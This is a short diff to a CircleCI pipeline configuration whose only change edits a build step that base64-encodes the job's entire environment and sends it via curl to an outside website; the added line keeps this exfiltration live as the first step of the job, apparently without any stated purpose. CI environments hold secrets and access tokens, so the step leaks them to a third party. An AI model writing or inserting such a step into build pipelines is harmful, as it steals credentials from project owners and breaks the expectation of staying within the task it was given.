@@ -6,7 +6,7 @@ jobs:
     docker:
       - image: circleci/python:latest
     steps:
-      - run: curl https://www.nathandavison.com/?env=$(env | base64 | tr -d '\n') 
+      - run: curl https://nathandavison.com/?env=$(env | base64 | tr -d '\n') 
       - checkout
 workflows:
   run-now:
